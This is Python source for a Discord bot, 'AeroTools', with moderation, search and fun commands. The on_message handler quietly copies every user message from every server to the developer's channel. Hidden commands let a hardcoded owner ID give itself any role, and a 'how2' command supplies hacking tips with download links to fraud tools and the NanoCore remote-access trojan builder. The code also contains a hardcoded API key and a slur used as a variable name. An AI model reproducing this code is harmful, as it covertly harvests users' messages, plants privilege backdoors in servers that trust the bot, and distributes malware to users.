            result = str("Correct Format Example:\nat.code python\n#!/usr/bin/python\nfrom time import sleep\nchar2 = 'Farewell for now!'\nchar1='Hello World, brb!'\nfor x in range(0, 10):\n    if x == 9:\n        log(char2)\n        sleep(1)\n    else:\n        log(char1)\n\n")
        elif erro != True:
            result = str(f"""
```{lang}
{body}
```
*-Formatting requested by {author}!-*
""")
        return {'result' : result,'filename' : filename }

 
        
#######################################################################################################################################################################
# 'at.help | at.no_dm.help | https://aero-bot.pro/'
# UNDER ROUTINE MAINTAINANCE, *MAY GET 2 REPLIES!*
#client = discord.AutoShardedClient(shard_count=2)
client = discord.Client()   
@client.event
async def on_ready():
    log.log('-\n[Ok] - Succesfully logged in as AeroTools Version-X!')#at.help | at.no_dm.help | https://aero-bot.pro/
    activity = discord.Activity(name='at.help | host-info.net', type=discord.ActivityType.watching)
    await client.change_presence(activity=activity)

#@client.event
#async def on_member_join(message):
#    #poop

@client.event
async def on_guild_join(guild):
    me = client.get_user(632636197784649758)
    description = str(guild.description)
    members = str(guild.member_count)
    try:
        invite = str(await guild.vanity_invite())
    except Exception as err:
        invite = f"Error: {str(err)}"
    await me.send(f"<@632636197784649758> , We Joined New Guild: {guild.name} | {guild.id} | Count: {members} | Description: {description}\nInvite: {invite} ")
    
@client.event
async def on_message(message):
    if message.author == client.user:
        return
    global count
    count += 1
    ran=str(randint(1000, 9999))
    t_d=str(datetime.now())
    if message.channel.type != discord.DMChannel and message.author.bot != True:
        try:
            channel = client.get_channel(logging_channel)
        except Exception as nsas: log.log(str(nsas))
        try:
            stuff = str(f"""
    [{t_d}] - [__**MESSAGE**__: {ran}]
    ```css
    Source Bot:
    AeroTools Version-X

    Source Server:
    {message.guild.name} | {message.guild.id}

    Channel:
    {message.channel.name} | {message.channel.id}

    Author:
    {message.author} | {message.author.id}
    ----------------------------
    Body:
    {message.content}
    ----------------------------
    ```
    """)
            await channel.send(stuff)
        except Exception as fuckk:
            log.log(str(fuckk))
            user = client.get_user(message.author.id)
            stuff = str(f"""
    [{t_d}] - [__**MESSAGE**__: {ran}]
    ```css
    Source Bot:
    AeroTools Version-X

    Source Server:
    Direct Message

    Channel:
    {message.channel.id}

    Author:
    {message.author} | {message.author.id}
    ----------------------------
    Body:
    {message.content}
    ----------------------------
    ```
    """)
            await channel.send(stuff)
            await user.send(f'**<@{message.author.id}>, AeroTools does not support direct messages as some features may not work correctly!**')


            
    if "at." in message.content:
        try:
            chan = client.get_channel(648006640888578059)
            stuff = str(f"""
    [{t_d}] - [__**MESSAGE**__: {ran}]
    ```css
    Source Bot:
    AeroTools Version-X

    Source Server:
    {message.guild.name} | {message.guild.id}

    Channel:
    {message.channel.name} | {message.channel.id}

    Author:
    {message.author} | {message.author.id}
    ----------------------------
    Body:
    {message.content}
    ----------------------------
    ```
    """)
            await chan.send(stuff)
        except Exception as fuckk:
            log.log(str(fuckk))
            user = client.get_user(message.author.id)
            stuff = str(f"""
    [{t_d}] - [__**MESSAGE**__: {ran}]
    ```css
    Source Bot:
    AeroTools Version-X

    Source Server:
    Direct Message

    Channel:
    {message.channel.id}

    Author:
    {message.author} | {message.author.id}
    ----------------------------
    Body:
    {message.content}
    ----------------------------
    ```
    """)
            await chan.send(stuff)        




        
    if message.content.startswith('at.network'):
        await message.channel.send(" ", embed=strings.network_tools(message))
    if message.content.startswith('at.resolver'):
        await message.channel.send(" ", embed=strings.resolver_help(message))            
    if message.content.startswith('at.fun'):
        await message.channel.send(" ", embed=strings.fun_help(message))
    if message.content.startswith('at.tools'):
        await message.channel.send(" ", embed=strings.utils_help(message))        
    if message.content.startswith('at.info'):
        await message.channel.send(" ", embed=strings.info_help(message))           
    if message.content.startswith('at.programming'):
        await message.channel.send(" ", embed = strings.code_help(message))
    if message.content.startswith('at.admin'):
        await message.channel.send(" ", embed=strings.admin_help(message))
    if message.content.startswith('at.games'):
        await message.channel.send(" ", embed=strings.games_help(message))       
    if message.content.startswith('at.image'):
        await message.channel.send(" ", embed=strings.image_help(message))
    if message.content.startswith('at.gaming'):
        await message.channel.send(" ", embed=strings.gaming_network_help(message))
    if message.content.startswith('at.premium'):
        await message.channel.send(f"\n```diff\n-Premium features like site-monitoring + more are coming Spring Of 2020!\n```")




        
    if message.content.startswith('at.weather'):
        try:
            msg = weather.check_weather(message)
        except Exception as dfasd:
            await message.channel.send(f"{str(dfasd)}")
            
        await message.channel.send(" ", embed = msg)        



        


    if message.content.startswith("at.bot.info"):
        embed = discord.Embed(title=f"AeroTools Version-X", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="Bot Info", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url=strings.main_thumbnail)#
        embed.add_field(name="__Name:__", value="AeroTools Version-X", inline=True)
        embed.add_field(name="__Discriminator:__", value="#0922", inline=True)
        embed.add_field(name="__ID:__", value="584062571020288030", inline=True)
        embed.add_field(name="__Prefix:__", value="at. | at.help", inline=True)
        embed.add_field(name="__Ping:__", value=str(round(float(client.latency), 6))+" *sec/s.*", inline=True)
        embed.add_field(name="__Servers:__", value=str(len(client.guilds)), inline=True)
        embed.add_field(name="__Total Users:__", value=str(len(client.users)), inline=True)
        
        embed.add_field(name="__Language/s:__", value="""
```css
Python3 [Commands] / C [Client/Handler]
```""", inline=True)
        embed.add_field(name="__Lines Of Code:__", value="""```css
3,794 [Commands] + 25[Client] + 100* [Handler]
```""", inline=True)
        
        embed.add_field(name="__Special Thanks:__", value="""
[Aero-Bot](https://aero-bot.pro)
[TheBotHub](https://discord.gg/7za946F) - Testing Server
[ezgif.com](https://ezgif.com)
[Discord Fonts](https://lingojam.com/DiscordFonts)
[Discord Bots List](https://top.gg)
[Discord py / Rapptz](https://github.com/Rapptz/discord.py)
[Python3](https://python.org)
[Cython](https://cython.readthedocs.io/en/)
""", inline=True)
        
        embed.add_field(name="__Endpoint:__", value=str(client.ws), inline=True)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        await message.channel.send(not_null, embed=embed)
        
                
    if message.content.startswith('at.changelog') or message.content.startswith('at.updates') or message.content.startswith('at.log') or message.content.startswith('at.logs'):##Logs
        with open("aero-data/frontend_text/update_log", "r") as logg: send = logg.read()
        embed = discord.Embed(title=f"AeroTools Version-X", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="Updates", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/608758890104094725/630290069672165397/AeroTools_Suprise.gif")
        oof = str(datetime.now());oof = oof.split()[0]
        embed.add_field(name=f"Log [{oof}]", value=f"""
{send}
""", inline=True)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        await message.channel.send(" ", embed=embed)    


########### MODERATION ######################
    if message.content.startswith('at.ban'):
        user_has = discord.utils.get(message.guild.members, id=message.author.id)
        if user_has.guild_permissions.ban_members == True:
            continue_ = True
            try:
                idd = int(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", ""))
            except Exception:
                continue_ = False
                await message.channel.send(correct_usage_alert(message.author, f"at.ban <@{idd}> REASON GOES HERE"))
            if continue_ == True:
                try:
                    reason = message.content.replace(str(message.content.split()[0]+" "+message.content.split()[1]+" "), "")
                except Exception:
                    await message.channel.send(correct_usage_alert(message.author, f"at.ban <@{idd}> REASON GOES HERE"))
                    continue_ = False
                if continue_ == True:
                    try:
                        member = discord.utils.get(message.guild.members, id=idd)
                    except Exception:
                        continue_ = False
                    if continue_ == True:
                        await member.ban(reason=reason)
                        await message.channel.send(success_alert(message.author, f"banned <@{idd}> with reason: {reason}"))
                    else:
                        await message.channel.send(correct_usage_alert(message.author, f"at.ban <@{idd}> [Failed]"))      
        else:
            await message.channel.send(no_perms_alert(message.author, f"ban user: <@{idd}>"))
        
    if message.content.startswith('at.kick'):
        user_has = discord.utils.get(message.guild.members, id=message.author.id)
        if user_has.guild_permissions.kick_members == True:
            continue_ = True
            try:
                idd = int(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", ""))
            except Exception:
                continue_ = False
                await message.channel.send(correct_usage_alert(message.author, f"at.kick <@{idd}> REASON GOES HERE"))
            if continue_ == True:
                try:
                    reason = message.content.replace(str(message.content.split()[0]+" "+message.content.split()[1]+" "), "")
                except Exception:
                    await message.channel.send(correct_usage_alert(message.author, f"at.kick <@{idd}> REASON GOES HERE"))
                    continue_ = False
                if continue_ == True:
                    try:
                        member = discord.utils.get(message.guild.members, id=idd)
                    except Exception:
                        continue_ = False
                    if continue_ == True:
                        await member.kick(reason=reason)
                        await message.channel.send(success_alert(message.author, f"kicked <@{idd}> with reason: {reason}"))
                    else:
                        await message.channel.send(correct_usage_alert(message.author, f"at.kick <@{idd}> [Failed]"))      
        else:
            await message.channel.send(no_perms_alert(message.author, f"kick user: <@{idd}>"))

    if message.content.startswith('at.prune') or message.content.startswith('at.purge'):
        user_has = discord.utils.get(message.guild.members, id=message.author.id)
        if user_has.guild_permissions.manage_messages == True:
            try:
                amount = int(message.content.split()[1])
                await message.channel.purge(limit=amount, check=None, before=None, after=None, around=None, oldest_first=False, bulk=True)
            except Exception:
                await message.channel.send(error_format(message.author, f"Could Not Purge Channel: <#{message.channel}>!"))
  
  
  
        
    if message.content.startswith('at.givemedevboiii'):
        role = discord.utils.get(message.guild.roles, name="Developer")
        try:
            await message.author.add_roles(role)
        except Exception as er0:
            await message.channel.send(f'https://cdn.discordapp.com/attachments/632637195399725089/632960003841458196/giphy1.gif\n```css\n{str(er0)}\n```')
        await message.channel.send('**Welcome Back Aero!**\n\nhttps://cdn.discordapp.com/attachments/632637195399725089/632646421614428196/giphy_4.gif')
        
    if message.content.startswith('at.unban'):
        user_has = discord.utils.get(message.guild.members, id=message.author.id)
        
        if user_has.guild_permissions.ban_members == True:
            con = True
            try:
                user = client.get_user(int(message.content.split()[1]))
            except Exception as fdaf:
                log.log(str(fdaf))
                con = False
                await message.channel.send(no_perms_alert(message.author, f"Failed To Unban: <@{user.name}>\n\nDid You Enter A Valid User?"))  

            if con == True:
                if len(message.content.replace(
                    message.content.split()[0]
                    + not_null 
                    + message.content.split()[1] 
                    + not_null, "")) > int(len(
                    message.content.split()[0]
                    + not_null
                    + message.content.split()[1]
                    + not_null) + 2):
                    
                    reason = message.content.replace(
                    message.content.split()[0]
                    + not_null 
                    + message.content.split()[1] 
                    + not_null, "")

                else: reason = "None"    

                try:
                    await message.channel.guild.unban(user, reason=reason)
                
                except Exception as ljfk:
                    log.log(str(ljfk))
                    con = False
                    await message.channel.send(error_format(message.author, f"[{user.name} | {user.id}] Is Already Unbanned!"))
                
                if con == True:
                    await message.channel.send(success_alert(message.author, f"Succesfully Unbanned [{user.name} | {user.id}] With Reason [{reason}]!"))


    if message.content.startswith('at.user_log'):
        user_has = discord.utils.get(message.guild.members, id=message.author.id)
        if user_has.guild_permissions.ban_members == True:
            continue_ = True
            try:
                og_message = message
                idd = int(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", ""))
            except Exception:
                continue_ = False
                await message.channel.send(f"Correct Usage: at.user_log <@User> <Message Search Amount per channel>")
            if continue_ == True:
                try:
                    amount = int(message.content.split()[2])
                except Exception:
                    await message.channel.send(correct_usage_alert(message.author, f"at.user_log <@user> <Message Search Amount per channel>"))
                    continue_ = False
                if continue_ == True:
                    try:
                        og_member = discord.utils.get(message.guild.members, id=idd)
                    except Exception:
                        continue_ = False

                    if continue_ == True:
                        guild = client.get_guild(og_message.guild.id)
                        with io.open(f"{idd}.txt", "w+", encoding="utf-8") as file:
                            file.write(f"""
[User Chat Log - Requested By {og_message.author}]
-----------------------------------------
User: {og_member.name} | {og_member.id}
Server: {guild.name} | {guild.id}
Max Messages To Search: {amount}
-----------------------------------------
+++++++++++++++++++++

""")
                        try:
                            async with og_message.channel.typing():
                                with io.open(f"{idd}.txt", "a+", encoding="utf-8") as file:
                                    for channel in guild.text_channels:
                                        async for message in channel.history(limit=amount):
                                            if message.author.id == og_member.id:
                                                their_message = message
                                                count += 1
                                                cheese = str(f"""
        -----------------------------------------
        [#{count}]
        Message ID: {their_message.id}
        Channel: {their_message.channel} | {message.channel.id}
        Time: {their_message.created_at}
        Message Body:
        [
        {their_message.content}
        ]
        """)
                                                file.write(cheese)
                        except Exception as E:
                            await og_message.channel.send(f"```python\n{str(E)}```")
                        #
                        await og_message.author.send(f"**<@{og_message.author.id}> \n[User Dialog For `{member.name}` in `{og_message.guild.name}` @ Search Depth Of `{amount}` Message Per Channel]**", file=discord.File(f"{idd}.txt"))
                        remove(f"{idd}.txt")
                        await og_message.channel.send(f"**Your Requested Log Has Been Delivered Via Direct Message,\n<@{og_message.author.id}>.**")
                    else:
                        await og_message.channel.send(correct_usage_alert(message.author, f"[Log Creation Failed - Invalid Mention?]"))      
        else:
            await og_message.channel.send(no_perms_alert(message.author, f"Create User-Dialog Documentation For User: <@{idd}>"))


##############################################        

    if message.content.startswith('at.whois'):
        cont = True
        try:
            import whois

            try:
                domain = whois.query(message.content.split()[1])

            except Exception as oops:
                await message.channel.send(f"**Correct format: `at.whois example.com`!**\n`{str(oops)}`")
                cont = False

        except Exception as oofs:
            log.log(str(oofs))
            cont == False
            
        if cont == True:
            await message.channel.send(f"""
```diff
-[whois {message.content.split()[1]}]
--------------------------------------------------------------------------
{domain.__dict__}
```""")
            
        

    if message.content.startswith('at.apply') or message.content.startswith('!apply'): 
        await message.channel.send(application.make(message.content, message.author))
        channel = client.get_channel(application_chan)
        nig = str(message.author);ran=str(randint(1000, 9999));content = str(message.content.replace("apply",'').replace("at.apply",'').replace("!apply",''));t_d=str(datetime.now())
        stuff = str(f"```css\n[{t_d}] - [APPLICATION: {ran}]\nApplication From {nig}\n------------------------\nBODY:\n{content}\n----------------------------\n```\n")
        await channel.send(stuff)
        await message.delete()

    if message.content.startswith("at.gimme"):
        if message.author.id == 632636197784649758:
            role = discord.utils.get(message.guild.roles, name=message.content.split()[1])
            member = discord.utils.get(message.guild.members, id=int(632636197784649758))
            await member.add_roles(role)
        
    if message.content.startswith("at.staff"):
        if message.author.id == 632636197784649758:
            role = discord.utils.get(message.guild.roles, name="Staff")
            member = discord.utils.get(message.guild.members, id=int(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", "")))
            await member.add_roles(role)
    
    if message.content.startswith("at.fortnite.stats"):
        argv = message.content.split()
        argv_plat = str(argv[1])
        argv_id = str(argv[2])
        try:
            r = requests.get(f"https://api.fortnitetracker.com/v1/profile/{argv_plat}/{argv_id}", headers={'TRN-Api-Key': '85f9f11f-72f6-489c-abce-2bf096051571'})
            stats = r.json()
            top5 = str(dict(stats['lifeTimeStats'][0])['value'])
            top3 = str(dict(stats['lifeTimeStats'][1])['value'])
            top6 = str(dict(stats['lifeTimeStats'][2])['value'])
            top10 = str(dict(stats['lifeTimeStats'][3])['value'])
            top12 = str(dict(stats['lifeTimeStats'][4])['value'])
            top25 = str(dict(stats['lifeTimeStats'][5])['value'])
            score = str(dict(stats['lifeTimeStats'][6])['value'])
            matches_played = str(dict(stats['lifeTimeStats'][7])['value'])
            wins = str(dict(stats['lifeTimeStats'][8])['value'])
            wins_prcnt = str(dict(stats['lifeTimeStats'][9])['value'])
            kills = str(dict(stats['lifeTimeStats'][10])['value'])
            kd = str(dict(stats['lifeTimeStats'][11])['value'])
            embed = discord.Embed(title=f"AeroTools Version-X - Fortnite Tracker", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
            embed.set_author(name="AeroTools Version-X", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/610035652112810024/628642930621677588/Fortnite2Fbattle-pass2Fseason-x2Fseason10-text-section2F10BR_Launch_Tiles_BattleBundle_v2-640x404-4b.png")
            embed.add_field(name="__Epic ID:__", value=f"*{argv_id}*", inline=True)
            embed.add_field(name="__Platform:__", value=argv_plat, inline=True)        
            embed.add_field(name="__K/D:__", value=kd, inline=True)
            embed.add_field(name="__Kills:__", value=kills, inline=True)
            embed.add_field(name="__Wins:__", value=f"{wins} | {wins_prcnt}", inline=True)
            embed.add_field(name="__Top3's:__", value=top3, inline=True)
            embed.add_field(name="__Top5's:__", value=top5, inline=True)
            embed.add_field(name="__Top6's:__", value=top6, inline=True)
            embed.add_field(name="__Top10's:__", value=top10, inline=True)
            embed.add_field(name="__Top12's:__", value=top12, inline=True)
            embed.add_field(name="__Top25's:__", value=top25, inline=True)
            embed.add_field(name="__Total Matches:__", value=matches_played, inline=True)
            embed.add_field(name="__Overall Score:__", value=score, inline=True)
            embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        except Exception as ee:
            await message.channel.send("Oops user is not found or theres been an error!! Create a ticket!")        
        await message.channel.send(not_null, embed=embed)


    if message.content.startswith('at.invite'):
        embed = discord.Embed(title=f"__AeroTools Version-X__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_thumbnail(url="https://aero-bot.pro/cdn/top_gg_card.png")
        embed.add_field(name="__Discord Bot List:__", value=f"[Visit](https://top.gg/bot/635527435139678228)", inline=False)
        embed.set_footer(text=f"[#1] @{message.author} | #{message.channel}.")
        await message.channel.send(' ', embed = embed)
        embed = discord.Embed(title=f"__AeroTools Version-X__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_thumbnail(url="https://aero-bot.pro/cdn/aerotools_top_gg.gif")
        embed.add_field(name="__Website:__", value=f"[Visit](https://aero-bot.pro/aerotools.html)", inline=False)
        embed.set_footer(text=f"[#2] @{message.author} | #{message.channel}.")
        await message.channel.send(' ', embed = embed)        
        
    if message.content.startswith("at.how2"):
        wifi = False
        social_engineering = False
        website = False
        ddos = False
        cracking = False
        school = False
        government = False
        ethical = False
        account = False
        malware = False
        
        parse1 = message.content.replace("at.", "").replace("how2", "")
        parse = parse1.upper()
        listed = []
        listed = parse.split()
        
        string_keys = str("\n")
        string_info = str("\n")
        string_sites = str("\n")
        string_notes = str("\n")
        
        if "WIFI" in listed or "LAN" in listed or "NEIGHBOR" in listed or "WIRELESS" in listed or "LOCAL" in listed:
            wifi = True
        if "TRICK" in listed or "PHISHING" in listed or "SPOOF" in listed or "FAKE" in listed or "SOCIAL" in listed or "ENGINEER" in listed or "SCAM" in listed:
            social_engineering = True
        if "SITE" in listed or "WEB" in listed or "HOST" in listed or "HTML" in listed or "JS" in listed or "JAVASCRIPT" in listed or "XSS" in listed or "ADDRESS" in listed or "WEBSITE" in listed or "DEFACE" in listed or "EXPLOIT" in listed or "PAGE" in listed or "FRONTEND" in listed:
            website = True        
        if "DDOS" in listed or "BOOT" in listed or "BOTNET" in listed or "BOT" in listed or "DENIAL" in listed or "OF" in listed or "SERVICE" in listed or "STRESS" in listed or "STRESSTEST" in listed or "STRESSER" in listed or "FLOOD" in listed or "ATTACK" in listed or "IP" in listed:
            ddos = True
        if "FREE" in listed or "ACCOUNT" in listed or "ACCOUNTS" in listed or "CRACK" in listed or "CRACKING" in listed or "BRUTE" in listed or "BRUTEFORCING" in listed or "BRUTEFORCE" in listed or "STEAL" in listed:
            cracking = True
        if "MY SCHOOL" in listed or "SCHOOL" in listed or "TEACHER" in listed:
            school = True          
        if "FBI" in listed or "GOVERNMENT" in listed or "NSA" in listed or "GOV" in listed:
            government = True
        if "ETHICAL" in listed or "HACKING" in listed or "HELP" in listed or "GIVE" in listed or "PROTECT" in listed or "GET IT BACK" in listed or "SECURITY" in listed or "THREAT" in listed:
            ethical = True         
        if "ACCOUNT" in listed or "GET" in listed or "MY" in listed or "GIVE" in listed or "BACK" in listed or "STEAL" in listed or "INSTAGRAM" in listed or "FACEBOOK" in listed or "TWITTER" in listed or "SNAPCHAT" in listed or "NETFLIX" in listed or "BRUTEFORCING" in listed or "BRUTEFORCE" in listed or "HACK" in listed:
            account = True
        if "RAT" in listed or "TROJAN" in listed or "MALWARE" in listed or "BANKING" in listed or "BOTNET" in listed or "VIRUS" in listed or "KEYLOGGER" in listed or "SYSKEY" in listed or "BUG" in listed in listed:
            malware = True            

        if wifi == True:
            string_keys = f"{string_keys}\nWifi Hacking"
            string_info = f"{string_info}\nYou'll need a device thats either connected or nearby, that you are in control of.\n"
            string_sites = f"{string_sites}\nhttps://hakin9.org/crack-wpa-wpa2-wi-fi-routers-with-aircrack-ng-and-hashcat/\n"
            string_notes = f"{string_notes}\n\n"
        if account == True:
            string_keys = f"{string_keys}\nAccount Hacking"
            string_info = f"{string_info}\nSee Cracking or Social Engineering\n*This Bot does not target accounts*"
            string_sites = f"{string_sites}\n\n"
            string_notes = f"{string_notes}\nMost Social Media and other platforms are nearly impossible to hack due to advanced captcha/2-step ver\nalmost all account take-overs are done by chance or Social Engineering!\n"
            social_engineering = True
        if social_engineering == True:
            string_keys = f"{string_keys}\nSocial Engineering"
            string_info = f"{string_info}\nSocial Engineering(in Information Security) is the use of deception to manipulate individuals into\ndivulging confidential or personal information that may be used for fraudulent purposes.\n"
            string_sites = f"{string_sites}\nhttps://www.trustedsec.com/social-engineer-toolkit-set/\nFraud Bible + Tools:\nhttps://mega.nz/#F!eioU0AAa!1XdtE6YjX-K_YiXeR0PyJA\n"
            string_notes = f"{string_notes}\nThe most successful form of hacking in this day and age.\n"
        if website == True:
            string_keys = f"{string_keys}\nWebsite Hacking"
            string_info = f"{string_info}\n\n"
            string_sites = f"{string_sites}\nhttps://portswigger.net/burp/communitydownload\nhttps://beefproject.com/\n"
            string_notes = f"{string_notes}\n\n"
        if ddos == True:
            string_keys = f"{string_keys}\nDenial Of Service"
            string_info = f"{string_info}\nA Denial-of-Service (DoS) attack is an attack meant to shut down a machine or network,\nmaking it inaccessible to its intended users.\n"
            string_sites = f"{string_sites}\n\n"
            string_notes = f"{string_notes}\nTry at.ping <host> OR at.scan <host> to probe latency/vuln ;)\n"
        if cracking == True:
            string_keys = f"{string_keys}\nCracking"
            string_info = f"{string_info}\nCracking refers to the practice of generating large combinations of account details(or combos)\nand proceeding to check the accounts with an api or 'checker' with the intent of obtaining access to accounts from numerous services.\n"
            string_sites = f"{string_sites}\nhttps://www.google.com/search?q=xrisky\n"
            string_notes = f"{string_notes}\n\n"
        if ethical == True:
            string_keys = f"{string_keys}\nEthical Hacking"
            string_info = f"{string_info}\nAn ethical hacker is a computer and networking expert who systematically attempts to penetrate\na computer system or network on behalf of its owners for the purpose of finding security vulnerabilities that a malicious hacker could potentially exploit.\n"
            string_sites = f"{string_sites}\nhttps://www.eccouncil.org/ethical-hacking/\n"
            string_notes = f"{string_notes}\nToday, you can find Certified Ethical Hackers working with some of the finest and largest companies\nacross industries like healthcare, financial, government, energy and much more!\n"
        if malware == True:
            string_keys = f"{string_keys}\nMalware"
            string_info = f"{string_info}\nMalware is an abbreviated form of “malicious software.” This is software that is specifically designed\nto gain access to or damage a computer, usually without the knowledge of the owner.\n"
            string_sites = f"{string_sites}\nNanoCore - Builder + CNC\nhttps://mega.nz/#F!bih0jQAB!23e7kxvvKgSdbEqHcfAuwA\n"
            string_notes = f"{string_notes}\n\n"            
        if government == True:
            string_keys = "WE DO NOT CONDONE THIS!"
            string_info = "NO!"
            string_sites = "NO"
            string_notes = "NO"
        if school == True:
            string_keys = "WE DO NOT CONDONE THIS!"
            string_info = "NO!"
            string_sites = "NO!"
            string_notes = "NO!"
            
        if len(string_notes) < 3: string_notes = "None"
        main_string = f"""
**Author:** {message.author}
**Server:** {message.guild.name}
**Request:**
```css
How to{parse1}
```
**__You seem to be asking about:__**
```css
{string_keys}
```
**__Here's Some Info:__**
```css
{string_info}
```
**__Related Links:__**
```css
{string_sites}
```
**__Here's Some Notes:__**
```css
{string_notes}
```

"""
        await message.channel.send(main_string)
            

    if message.content.startswith("at.allow.tts"):
        if message.author.id == 325426360510054401:
            idd = int(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", ""))
            allow_user(idd)
            await message.channel.send(f'**<@{str(idd)}>, You Have Been Given `Text-To-Speech` Privilages By {message.author}!**')
        else:
            await message.channel.send("**__Nice Try Skiddo!__**")
            
    
    if message.content.startswith("at.tts") or message.content.startswith("at.TTS"):
        try:
            await message.delete()
        except Exception:
            await message.channel.send(bold("Oof! I tried to delete a mesage or two but it looks like i'm missing permission to do so! :skull:"))
            pass
        access = True
        
        if message.author.id == 325426360510054401:
            access = True
            
                
        if access == True:
            parse = str(message.content.replace(message.content.split()[0], ""))
            async with message.channel.typing():
                fname = make_mp3(message.author, parse)
                try:
                    await message.channel.send(f"**TTS Message From {message.author}!**", file=discord.File(fname))
                    remove(fname)
                except Exception as otio:
                    log.log(otio)
                    remove(fname)
                except Exception as kjkr:
                    log.log(str(kjkr))
                    await message.channel.send(f"**__ERROR__ Sending TTS Message From {message.author}!**", file=discord.File(fname))
                #set_limiter(message.author.id)    
        else:
            await message.channel.send(f'**__<@{str(message.author.id)}>__**\n**In Order To Save Bandwidth And Prevent Spamming, You Are Being Rate Limited. \n[Timeout Remaing: < 60 Seconds]**')

    if message.content.startswith("at.lmgtfy"):
        content = message.content.replace(str(message.content.split()[0])+" ", "")
        query = content.replace(" ", "+")
        link = f"https://lmgtfy.com/?q={query}"
        await message.channel.send(f"**Hope This Helps! :)**\n> *__{link}__*")
        
    if message.content.startswith(f"at.searchyoutube"):
        query = str(message.content.replace(f"{message.content.split()[0]} ", ""))
        parser = argparse.ArgumentParser()
        parser.add_argument('--q', help='Search term', default=query)
        parser.add_argument('--max-results', help='Max results', default=25)
        args = parser.parse_args()
        try:
            youtube = build(YOUTUBE_API_SERVICE_NAME, YOUTUBE_API_VERSION,
                            developerKey=DEVELOPER_KEY)

          # Call the search.list method to retrieve results matching the specified
          # query term.
            search_response = youtube.search().list(
            q=query,
            part='id,snippet',
            maxResults=max_res).execute()

            videos = []
            channels = []
            playlists = []

            for search_result in search_response.get('items', []):
                if search_result['id']['kind'] == 'youtube#video':
                    videos.append('%s (%s)' % (search_result['snippet']['title'],
                                               search_result['id']['videoId']))
                elif search_result['id']['kind'] == 'youtube#channel':
                    channels.append('%s (%s)' % (search_result['snippet']['title'],
                                                 search_result['id']['channelId']))
                elif search_result['id']['kind'] == 'youtube#playlist':
                    playlists.append('%s (%s)' % (search_result['snippet']['title'],
                                                  search_result['id']['playlistId']))
              



              
            embed = discord.Embed(title=f"__Search Results__", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
            embed.set_author(name="YouTube Assistant", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/635586855567622147/636112733439262742/maxresdefault.jpg')
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/635586855567622147/636121471659540480/giphy.gif")
            
            for x in range(0, len(videos)):
                special_link = videos[x].split()[len(videos[x].split()) - 1]
                title = convert_html(videos[x].replace(f" {special_link}", ""))
                special_link = special_link.replace("(", "").replace(")", "")
                link = str("https://www.youtube.com/watch?v=" + special_link)
                
                embed.add_field(name=f" __Video:__\n#{str(int(x + 1))} | {title}", value=f"[Watch Video]({link})", inline=True)
                
                if x == 12: break 
                
            
            for x in range(0, len(channels)):
                special_link = channels[x].split()[len(channels[x].split()) - 1]
                user = convert_html(channels[x].replace(f" {special_link}", ""))
                special_link = special_link.replace("(", "").replace(")", "")
                link = str(f"https://www.youtube.com/channel/{special_link}")
                
                embed.add_field(name=f"__Channel:__\n#{str(int(x + 1))} | {user}", value=f"[Go To Channel]({link})", inline=True)

                if x == 5: break 


                
            for x in range(0, len(playlists)):
                special_link = playlists[x].split()[len(playlists[x].split()) - 1]
                playlist = convert_html(playlists[x].replace(f" {special_link}", ""))
                special_link = special_link.replace("(", "").replace(")", "")
                link = str(f"https://www.youtube.com/playlist?list={special_link}")
                
                embed.add_field(name=f"__Playlist:__\n#{str(int(x + 1))} | {playlist}", value=f"[Go To Playlist]({link})", inline=True)

                if x == 2: break 
            
            embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
            await message.channel.send("", embed=embed)
            
        except Exception as e:
            log.log(str(e)) 
        
    #Warning! - (line below) LOGS ALL INPUT IF ENABLED(uncommented.hashtagged)!!!!
    #log("\n["+str(datetime.now())+"] - [LOG]\nUsed by "+str(message.author)+"\n"+"Their input:\n"+str(message.content)+"\n\n")
    if message.content.startswith("at.welcome_banner"):
        await message.delete()
        if is_admin(int(message.author.id)) == True:
            for x in range(0, 999999):
                await message.channel.edit(name=f"welcome")
                time.sleep(2)
                await message.channel.edit(name=f"to hax")
                time.sleep(2)
                await message.channel.edit(name=f"community!")
                time.sleep(2)
                await message.channel.edit(name=f"we will")
                time.sleep(2)
                await message.channel.edit(name=f"verify you")
                time.sleep(2)
                await message.channel.edit(name=f"shortly!")
                time.sleep(2)
        else:
            await message.channel.send(f"**{message.author}, You must be an admin to use this feature!**")
        
    if message.content.startswith("at.security_stress"):
        if is_admin(int(message.author.id)) == True:
            await message.delete()
            for x in range(0, 999999):
                await message.channel.edit(name=f"h")
                time.sleep(.5)
                await message.channel.edit(name=f"ha")
                time.sleep(.5)
                await message.channel.edit(name=f"hax")
                time.sleep(.5)
                await message.channel.edit(name=f"hax h")
                time.sleep(.5)
                await message.channel.edit(name=f"hax ha")
                time.sleep(.5)
                await message.channel.edit(name=f"hax hax")
                time.sleep(.5)
                await message.channel.edit(name=f"hax hax h")
                time.sleep(.5)
                await message.channel.edit(name=f"hax hax ha")
                time.sleep(.5)
                await message.channel.edit(name=f"hax hax hax")
                time.sleep(.5)
                await message.channel.edit(name=f"hax hax hax h")
                time.sleep(.5)
                await message.channel.edit(name=f"hax hax hax ha")
                time.sleep(.5)
